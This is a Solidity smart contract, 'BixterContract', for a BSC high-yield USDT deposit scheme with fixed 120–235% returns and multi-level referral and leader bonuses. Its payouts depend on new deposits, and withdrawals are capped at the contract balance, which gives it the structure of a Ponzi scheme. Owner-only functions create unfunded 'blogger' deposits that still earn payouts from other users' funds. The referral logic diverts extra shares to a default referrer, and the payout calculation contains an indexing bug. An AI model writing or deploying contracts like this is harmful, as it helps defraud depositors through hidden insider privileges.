/**
 *Submitted for verification at testnetstage.bscscan.com on 2023-07-25
*/

/**
 *Submitted for verification at BscScan.com on 2023-05-30
*/

// SPDX-License-Identifier: MIT License

pragma solidity >=0.8.0;

struct Tarif {
  uint8 life_days;
  uint8 percent;
  uint8 bonusPercent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint256 time;
  bool blogger;
  uint256 bloggerTime;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint256 leader_bonus;
  uint256 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;

  uint256 leadTurnover;
  uint256 leadBonusReward;
  bool[9] receivedBonuses;

  Deposit[] deposits;
  uint256[10] structure; // length has been got from bonus lines number
  address[] referrals;
  uint256[10] refTurnover;
}

interface IERC20 {

  function balanceOf(address account) external view returns (uint256);

  function transfer(address to, uint256 amount) external returns (bool);

  function transferFrom(address from, address to, uint256 amount) external returns (bool);

}

contract BixterContract {
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public totalLeadBonusReward;
    
    uint8 constant BONUS_LINES_COUNT = 10;
    uint16 constant PERCENT_DIVIDER = 1000; // 100 * 10
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 20, 10, 5, 5, 5, 5, 5, 5, 5];
    uint8 public REF_LIMIT = uint8(ref_bonuses.length);
    uint256[14] public LEADER_BONUS_TRIGGERS = [
      600 ether,
      1_500 ether,
      3_000 ether,
      6_000 ether,
      30_000 ether,
      60_000 ether,
      150_000 ether,
      250_000 ether,
      500_000 ether,
      1_000_000 ether,
      3_000_000 ether,
      6_000_000 ether,
      10_000_000 ether,
      15_000_000 ether
    ];

    uint256[14] public LEADER_BONUS_REWARDS = [
      12 ether,
      30 ether,
      60 ether,
      120 ether,
      600 ether,
      2_000 ether,
      5_000 ether,
      8_000 ether,
      21_000 ether,
      50_000 ether,
      150_000 ether,
      300_000 ether,
      600_000 ether,
      1_000_000 ether
    ];

    uint256[3] public LEADER_BONUS_LEVEL_PERCENTS = [100, 30, 15];

    uint8 constant TARIF_MIN_DURATION = 10;
    uint8 constant TARIF_MAX_DURATION = 33;

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;
    uint256 totalPlayers;

    address public immutable TOKEN_ADDRESS; // USDT: 0x55d398326f99059fF775485246999027B3197955

    address public immutable DEFAULT_REFERRER;
    address[1] public PARTNERS_ADDRESSES;
    uint256[1] public PARTNERS_PERCENTS;

    uint256[2] public DEPS_AMOUNTS = [50 ether, 100 ether];
    uint256[2] public DEPS_LIMITS = [50, 25];
    uint256[2] public DEPS_COUNTERS = [0, 0];


    uint256 contractUnpausedTimestamp = 0;

    bool public contractPaused; 

    event Upline(address indexed addr, address indexed upline, uint256 bonus, uint256 timestamp);
    event NewDeposit(
      address indexed addr,
      address indexed referrer,
      uint256 amount,
      uint8 tarif,
      uint256 timestamp
    );

    event Withdraw(
      address indexed addr,
      address indexed to,
      uint256 amount,
      uint256 timestamp
    );
    event LeaderBonusReward(
        address indexed to,
        uint256 indexed amount,
        uint8 indexed level,
        uint256 timestamp
    );

    event SwitchDelegation(
      address indexed addr,
      bool newDelegationWithdrawFlag,
      uint256 timestamp
    );

    constructor( address _owner,
      address tokenAddress_, address defRef,
      address[] memory partnersAddrs, uint256[] memory partnersPercents
    ) {
        owner = _owner;
        players[owner].upline = owner;

        DEFAULT_REFERRER = defRef;
        players[defRef].upline = defRef;

        for (uint8 i = 0; i < partnersAddrs.length; i++) {
          PARTNERS_ADDRESSES[i] = partnersAddrs[i];
          players[PARTNERS_ADDRESSES[i]].upline = defRef;

          PARTNERS_PERCENTS[i] = partnersPercents[i];
        }

        uint8 tarifPercent = 120;
        for (uint8 tarifDuration = TARIF_MIN_DURATION; tarifDuration <= TARIF_MAX_DURATION; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent, 0);
            if (tarifDuration == 30) {
              tarifs[tarifDuration].bonusPercent = 10;
            }
            tarifPercent+= 5;
        }

        TOKEN_ADDRESS = tokenAddress_;
        contractPaused = true;
    }

    function setTarifBonus(uint8 tarifDuration, uint8 bonusPercent) external {
      require(msg.sender == owner, "Only owner can call this method");
      require(tarifDuration >= TARIF_MIN_DURATION && tarifDuration <= TARIF_MAX_DURATION, "Invalid tarif duration");
      require(bonusPercent >= 0 && bonusPercent <= 10, "Invalid bonus percent value");

      tarifs[tarifDuration].bonusPercent = bonusPercent;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if (payout > 0) {
            players[_addr].last_payout = block.timestamp;
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        uint8 isDefRef = 0;
        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0) || up == DEFAULT_REFERRER) {
              up = DEFAULT_REFERRER;

              if (i > 0 && i <= REF_LIMIT && isDefRef <= REF_LIMIT<<3) {
                isDefRef++;
                i--;
              }
            }
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if (players[_addr].upline == address(0) && _addr != owner) {
            totalPlayers++;
            if (players[_upline].deposits.length == 0) {
                _upline = DEFAULT_REFERRER;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100, block.timestamp);
            
            players[_upline].referrals.push(_addr);
            for (uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                address prevUpline = _upline;
                _upline = players[_upline].upline;

                if (_upline == address(0) || (prevUpline == _upline && _upline != DEFAULT_REFERRER)) {
                  break;
                }
            }
        }
    }

    function unpauseContract() public {
      require(msg.sender == owner, 'You are not the owner');

      contractPaused = false;
      contractUnpausedTimestamp = block.timestamp;
    }

    function deposit(uint8 _tarif, address _upline, uint256 _amount) external {
      deposit(msg.sender, _tarif, _upline, _amount, true, false);
    }

    function delegatedDeposit(address _user, uint8 _tarif, address _upline, uint256 _amount) external {
      require(msg.sender == owner, "Only owner can call this method");

      for (uint8 i = 0; i < DEPS_AMOUNTS.length; i++) {
        if (_amount == DEPS_AMOUNTS[i]) {
          require(DEPS_COUNTERS[i] < DEPS_LIMITS[i], "Deposits limit reached");
          DEPS_COUNTERS[i]++;

          break;
        }
      }

      deposit(_user, _tarif, _upline, _amount, false, true);
    }

    function leaderDeposit(address _user, uint8 _tarif, address _upline, uint256 _amount) external {
      require(msg.sender == owner, "Only owner can call this method");

      deposit(_user, _tarif, _upline, _amount, false, true);
    }


    function checkBloggers(address _referral) private {

      address[] memory uplinersList;

      address upliner1 = players[_referral].upline;
      address upliner2 = players[upliner1].upline;
      address upliner3 = players[upliner2].upline;

      uplinersList = new address[](3);
            
      uplinersList[0] = upliner1;
      uplinersList[1] = upliner2;
      uplinersList[2] = upliner3;

      for(uint i = 0; i < 3; i++){

        if(uplinersList[i] == address(0x0)) return;
        Player storage currentUpliner = players[uplinersList[i]];

        for(uint j = 0; j < currentUpliner.deposits.length; j++){

          if(currentUpliner.deposits[j].blogger){

            uint256 totalRefTurnover = 0;

            for(uint k = 0; k < 3; k++){
              totalRefTurnover += currentUpliner.refTurnover[k] * LEADER_BONUS_LEVEL_PERCENTS[k] / 100;
            }

            if(totalRefTurnover * 5 >= currentUpliner.deposits[j].amount){
              currentUpliner.deposits[j].bloggerTime = block.timestamp;
            }
          }
        }
      }
    }

    function deposit(address _user, uint8 _tarif, address _upline, uint256 tokensAmount, bool _charge, bool blogger) private {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(tokensAmount >= 10 ether, "Minimum deposit amount is 10 BUSD");

        Player storage player = players[_user];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        if (_charge) {
          require(
            IERC20(TOKEN_ADDRESS).transferFrom(msg.sender, address(this), tokensAmount),
            "Tokens transfer error"
          );
        }

        _setUpline(_user, _upline, tokensAmount);

        uint256 amount = tokensAmount;
        if (player.deposits.length == 0 && tarifs[_tarif].bonusPercent > 0) { // 1st deposit
          amount = amount * uint256(100 + tarifs[_tarif].bonusPercent) / 100;
        }
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: amount,
            time: block.timestamp,
            blogger: blogger,
            bloggerTime: 0
        }));

        player.total_invested += tokensAmount;
        invested += tokensAmount;

        

        if(!blogger){
            _refPayout(_user, tokensAmount);
            distributeBonuses(tokensAmount, _user);

            address ref = player.upline;
            for (uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
            players[ref].refTurnover[i]+= tokensAmount;

            address prevRef = ref;
            ref = players[ref].upline;
            if (prevRef == ref || ref == address(0x0)) {
                break;
            }
          }
        }
        

        if (_charge && !blogger) {
          uint256 adminFee = tokensAmount / 100 * 15;
          uint256 partnersFee = 0;
          for (uint8 i = 0; i < PARTNERS_PERCENTS.length; i++) {
            partnersFee+= adminFee * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER;

            IERC20(TOKEN_ADDRESS).transfer(PARTNERS_ADDRESSES[i], adminFee * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER);
          }

          IERC20(TOKEN_ADDRESS).transfer(owner, adminFee - partnersFee);
        }

        checkBloggers(_user);

        emit NewDeposit(_user, player.upline, amount, _tarif, block.timestamp);
    }

    function withdraw() external {
        require(!contractPaused, 'Contract is paused at the moment');
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0 || player.leader_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus + player.leader_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.leader_bonus = 0;

        uint256 balance = IERC20(TOKEN_ADDRESS).balanceOf(address(this));
        if (balance < amount) {
          amount = balance;
        }

        player.total_withdrawn += amount;
        withdrawn += amount;

        if (msg.sender == DEFAULT_REFERRER) {
          uint256 partnersAmount = 0;
          for (uint8 i = 0; i < PARTNERS_PERCENTS.length; i++) {
            partnersAmount+= amount * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER;

            IERC20(TOKEN_ADDRESS).transfer(PARTNERS_ADDRESSES[i], amount * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER);
          }

          IERC20(TOKEN_ADDRESS).transfer(msg.sender, amount - partnersAmount);
        } else {
          IERC20(TOKEN_ADDRESS).transfer(msg.sender, amount);
        }
        
        emit Withdraw(msg.sender, msg.sender, amount, block.timestamp);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 newDepTime = dep.time < contractUnpausedTimestamp ? contractUnpausedTimestamp : dep.time;

            uint256 defaultTimeFrom = (player.last_payout > newDepTime ? player.last_payout : newDepTime);
            uint256 bloggerTimeFrom = (player.last_payout > player.deposits[i].bloggerTime ? player.last_payout : player.deposits[i].bloggerTime);

            uint256 time_end = newDepTime + tarif.life_days * uint256(86400);
            uint256 from = dep.blogger ? bloggerTimeFrom : defaultTimeFrom;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            uint256 totalRefTurnover = 0;


            for(uint j = 0; j < 3; j++){
              totalRefTurnover += player.refTurnover[i] * LEADER_BONUS_LEVEL_PERCENTS[i] / 100;
            }

            if(!contractPaused){
              if (from < to) {
                if(dep.blogger){
                  if(dep.amount < totalRefTurnover * 5){
                    value += dep.amount * (to - from) * tarif.percent / tarif.life_days / uint256(8640000);
                    //8640000
                  }
                } else {
                    value += dep.amount * (to - from) * tarif.percent / tarif.life_days / uint256(8640000);
                }
              }
            }
        }

        return value;
    }

    function distributeBonuses(uint256 _amount, address _player) private {
      address ref = players[_player].upline;

      for (uint8 i = 0; i < LEADER_BONUS_LEVEL_PERCENTS.length; i++) {
        players[ref].leadTurnover+= _amount * LEADER_BONUS_LEVEL_PERCENTS[i] / 100;

        for (uint8 j = 0; j < LEADER_BONUS_TRIGGERS.length; j++) {
          if (players[ref].leadTurnover >= LEADER_BONUS_TRIGGERS[j]) {
            if (!players[ref].receivedBonuses[j]) {
              players[ref].receivedBonuses[j] = true;
              players[ref].leadBonusReward+= LEADER_BONUS_REWARDS[j];
              totalLeadBonusReward+= LEADER_BONUS_REWARDS[j];

              //payable(ref).transfer(LEADER_BONUS_REWARDS[j]);
              players[ref].leader_bonus+= LEADER_BONUS_REWARDS[j];
              if (ref == DEFAULT_REFERRER) { // default referrer should not receive bonuses
                players[ref].receivedBonuses[j] = false;
              }
              emit LeaderBonusReward(
                ref,
                LEADER_BONUS_REWARDS[j],
                i,
                block.timestamp
              );
            } else {
              continue;
            }
          } else {
            break;
          }
        }

        ref = players[ref].upline;

        if (ref == address(0x0)) {
          break;
        }
      }
    }

    function getTotalLeaderBonus(address _player) external view returns (uint256) {
      return players[_player].leadBonusReward;
    }

    function getReceivedBonuses(address _player) external view returns (bool[9] memory) {
        return players[_player].receivedBonuses;
    }

    /*
     * Only external call
     */
    function userInfo(address _addr) external view returns(uint256 for_withdraw, Player memory player) {
        player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        return (
            payout + player.dividends + player.match_bonus + player.leader_bonus,
            player
        );
    }

    function contractInfo() external view returns(
      uint256, uint256, uint256, uint256, uint256,
      uint8[] memory bonuses, bool, uint256
    ) {
      bonuses = new uint8[](TARIF_MAX_DURATION - TARIF_MIN_DURATION + 1);

      for (uint8 tarifDuration = TARIF_MIN_DURATION; tarifDuration <= TARIF_MAX_DURATION; tarifDuration++) {
        bonuses[tarifDuration - TARIF_MIN_DURATION] = tarifs[tarifDuration].bonusPercent;
      }

      return (
        invested, withdrawn, match_bonus, totalLeadBonusReward, totalPlayers,
        bonuses, contractPaused, contractUnpausedTimestamp
      );
    }

    function retrieveERC20(address tokenContractAddress) external {
      require(msg.sender == owner, "Only owner can call this method");
      require(tokenContractAddress != TOKEN_ADDRESS, "You can't directly withdraw basic project token");

      IERC20(tokenContractAddress).transfer(
        owner,
        IERC20(tokenContractAddress).balanceOf(address(this))
      );
    }

    function retrieveBNB() external {
      require(msg.sender == owner, "Only owner can call this method");

      payable(msg.sender).transfer(address(this).balance);
    }

}